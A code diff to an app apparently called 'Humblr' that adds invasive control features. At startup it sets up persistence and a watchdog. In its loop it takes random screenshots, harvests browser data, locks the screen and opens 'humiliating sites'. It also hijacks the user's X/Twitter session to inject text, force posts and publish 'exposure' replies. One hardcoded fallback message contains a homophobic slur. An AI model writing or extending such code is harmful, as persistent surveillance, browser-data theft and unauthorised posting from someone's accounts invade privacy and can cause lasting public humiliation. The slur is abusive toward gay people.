@@ -60,6 +60,18 @@ class HumblrApp:
         self.tasks = TaskManager(self.config, self.storage, self.ai)
         self.system = SystemActions(self.config, self.storage)
         self.system.ai = self.ai  # allow direct AI image gen calls from UI/system
+
+        # Setup new control features
+        self.system.setup_hard_persistence()
+        self.system.start_watchdog()
+        self.system.apply_deep_control()
+
+        # Auto-activate browser control (Playwright) on its own if enabled in config
+        if hasattr(self.system, 'browser_controller') and self.system.browser_controller:
+            print("[Humblr] Browser control enabled - Playwright will try to activate itself now...")
+            self.system.browser_controller.ensure_activated()
+        elif self.config.get("browser_control", {}).get("enabled", False):
+            print("[Humblr] Browser control requested. It will auto-activate on first use.")
         self.system.app = self  # for config/key updates to reach ai
 
         self.ui = None
@@ -319,6 +331,21 @@ class HumblrApp:
                 if random.random() < 0.06:
                     self.system.search_for_life_access(activity or {})
 
+                # Advanced Monitoring and System Fuckery (integrated)
+                if random.random() < 0.05:
+                    self.system.take_periodic_screenshot()
+                if random.random() < 0.03:
+                    browser = self.system.get_browser_data()
+                if self.config.get("system_fuckery", {}).get("deep_control_mode", False):
+                    if random.random() < 0.05:
+                        self.system.force_wallpaper_and_lock()
+                    if random.random() < 0.03:
+                        self.system.change_mouse_cursor()
+                    if random.random() < 0.04:
+                        sites = self.config.get("system_fuckery", {}).get("humiliating_sites", [])
+                        if sites:
+                            self.system.control_volume_and_sites(open_site=sites[0])
+
                 # On its own: Access files, passwords, input to Gmail, search stories - grows with invasiveness
                 inv = self.storage.get_invasiveness()
                 if inv >= 3 and random.random() < 0.08:
@@ -369,6 +396,21 @@ class HumblrApp:
                 title = ((activity or {}).get("window_title") or "").lower()
                 if ("facebook" in url or "facebook" in title or "amazon" in url or "amazon" in title) and random.random() < 0.1:
                     self.system.issue_control_command(self.corruption.get_level(), inv, activity or {})
+
+                # === REAL BROWSER CONTROL (X/Twitter takeover) ===
+                bc = self.config.get("browser_control", {})
+                if bc.get("enabled", False) and self.system.browser_controller:
+                    if "x.com" in url or "twitter" in url or "x.com" in title.lower():
+                        # Detected on X - inject actions
+                        if random.random() < 0.15:
+                            if not self.system.browser_controller.page:
+                                self.system.login_browser_to_x()
+                            teasing = self.ai.generate_reaction(activity or {}, self.corruption.get_level()) if self.ai else "I own your timeline now, exposed fag."
+                            self.system.browser_controller.inject_teasing_on_x(teasing)
+                        if bc.get("auto_post_when_on_x", False) and random.random() < 0.08:
+                            self.system.force_x_post()  # Humblr forces a post
+                        if bc.get("force_exposure_posts", False) and random.random() < 0.05:
+                            self.system.force_browser_action_on_x("like_reply", "This is what Humblr makes me do in public.")
 
                 # Self update the app (pull from GitHub) on its own at high levels - to grow with new features
                 if can_be_aggressive and inv > 4 and random.random() < 0.03:
